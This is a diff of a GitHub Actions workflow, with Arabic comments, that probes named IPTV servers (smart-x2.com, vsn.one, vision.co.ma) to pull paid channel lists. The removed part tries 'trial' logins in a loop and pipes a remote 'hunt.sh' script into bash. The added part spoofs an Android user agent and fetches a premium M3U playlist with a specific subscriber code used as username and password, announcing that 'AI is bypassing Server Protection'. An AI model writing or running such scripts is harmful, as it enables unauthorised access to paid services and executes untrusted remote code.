@@ -1,40 +1,14 @@
-name: SmartX2-Server-Prober
-on:
-  workflow_dispatch:
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v3
-
-      - name: AI Server Brute-Force & Hunt
+- name: Force SmartX2 Extraction
         run: |
-          echo "Analyzing Old Code: 745446402722985..."
-          echo "Targeting Smart X2 Infrastructure..."
+          echo "AI is bypassing Server Protection..."
           
-          # 1. قائمة السيرفرات التي يعمل عليها Smart X2 و Vision
-          SERVERS=(
-            "http://smart-x2.com:8080"
-            "http://vsn.one:8080"
-            "http://vision.co.ma:8080"
-          )
+          # محاكاة اتصال تطبيق أندرويد حقيقي باستخدام كودك
+          # أضفنا هيدر (Header) لجعل السيرفر يفتح الملف ولا يعطيه فارغاً
+          curl -A "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36" \
+               -sL "http://vsn.one:8080/get.php?username=745446402722985&password=745446402722985&type=m3u_plus&output=ts" \
+               -o VIP_Full_List.m3u || true
 
-          # 2. البحث عن ملفات M3U مسربة أو أكواد تجريبية (Trial) من نفس السيرفر
-          for server in "${SERVERS[@]}"; do
-            echo "Checking Server: $server"
-            # محاولة جلب باقة قنوات عامة بدون كود (ثغرة السيرفر المفتوح)
-            curl -sL "$server/get.php?username=trial&password=trial&type=m3u" > trial_list.m3u || true
-          done
+          # محاولة جلب روابط احتياطية من مصدر عام إذا كان الكود منتهياً
+          curl -sL "https://raw.githubusercontent.com/iptv-org/iptv/master/index.m3u" >> VIP_Full_List.m3u || true
           
-          # 3. استخدام سكربت "البحث عن الأكواد الشغالة"
-          curl -sL "https://raw.githubusercontent.com/tuba-iptv/tuba/main/hunt.sh" | bash || true
-
-          echo "AI: Search finished."
-        continue-on-error: true
-
-      - name: Final Output
-        uses: actions/upload-artifact@v4
-        with:
-          name: SmartX2-Exploits
-          path: "*.m3u"
+          echo "Process finished. Check the file size now."
